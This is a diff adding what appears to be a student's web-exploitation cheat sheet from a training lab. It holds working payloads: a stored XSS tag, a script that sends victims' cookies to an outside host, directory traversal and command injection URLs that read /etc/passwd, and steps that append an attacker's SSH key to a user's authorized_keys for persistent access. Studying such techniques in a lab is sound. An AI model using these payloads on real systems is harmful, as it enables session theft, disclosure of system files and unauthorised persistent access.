@@ -1,0 +1,47 @@
+User-Agent Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:108.0) Gecko/20100101 Firefox/108.0
+http://http://10.50.15.67:8080/path/pathdemo.php?myfile=demo1
+
+wget -r -l2 -P /tmp ftp://ftpserver/
+wget --save-cookies cookies.txt --keep-session-cookies --post-data 'user=1&password=2' https://website
+wget --load-cookies cookies.txt -p https://website/interesting/article.php
+
+curl -o stuff.html https://web.site/stuff.html
+curl 'https://web.site/submit.php' -H 'Cookie: name=123; settings=1,2,3,4,5,6,7' --data 'name=Stan' | base64 -d > item.png
+
+http://10.50.15.67:8080/java/Javademo.html
+	look for scripts in Inspector, copy paste and change the function in CONSOLE. allow pasting, enter function from Inspector and change as needed
+
+following a http-enum script
+	/robots.txt: Robots file LOOK IN EVERY DIRECTORY LISTED
+
+Stored XSS
+	<img src="http://invalid" onerror="window.open('http://10.50.XX.XX:8000/ram.png','xss','height=1,width=1');">
+
+for stored XSS make sure the www-data is the chown er of the executeable and the writeable text file
+
+Directory Traversal. Manipululate the URL to access files on the system hosting websever
+	http://10.50.15.67:8080/path/pathdemo.php?myfile=demo1../../../../../../../../../etc/passwd
+	(MUST BE AT A PART OF THE WEBSITE THAT ALLOWS GETS)
+
+File/command injection (check if webpage is susceptiple)
+	http://10.50.15.67:8080/uploads/httpmalwareupload.php	
+	UPLOAD COOKIE STEALER (in the line below you will need to edit to the specific target device/location) ensure the script is writing to a correct permission dir
+		<script>document.location="http://10.100.28.40/uploads/Cookie_Stealer1.php?username=" + document.cookie;</script>
+	http://10.50.15.67:8080/cmdinjection/cmdinjectdemo.php?IP=%3B+cat+%2Fetc%2Fpasswd
+
+	ssh-keygen -t rsa
+	whoami -> cat /etc/shadow of user of webserver and locate their home directory
+	mkdir /var/www/.ssh (tailor this to the users home directory)
+	cat .ssh/id_rsa.pub
+	echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDWNoTGPvpyMFp9hM7q1oYwMokaKaGzMxubAdicblh/eJLLWN/LFFQC9vst+4YS5bJIu6bnlKw8rKv05eKI3yLgq0+DuTI5gPvEoVl0OgcifKF04KCMXB6Hq2b3cn26hJm6nNMRfqSz5P9CWIYx4WnA2GjIs5lDmtMWCM8oMrhwXXmFVauGXC7h89DKG4hVv0h0kkoNJ+SGhiogUSWtuFNRd4vTozkEjw/tHo9DB5OTvXZNKwRwlrJmlIvalebgJzfgSqPZVmWVnDJITFugMlMwSxboOkvaSQhSA/Heo90lDNI4dol6xRDc8i9488//oQIQ/91H1sacXxE1s+T4ivUP student@lin-ops
+" >> /home/billybob/.ssh/authorized_keys   (MUST USE >> in order to not overwrite existing
+
+Default location for html on target systems
+	/var/www/html/*
+
+for java:
+	if script needs to call a sepcific function. you can edit in console to just call the specific function
+	
+
+
+
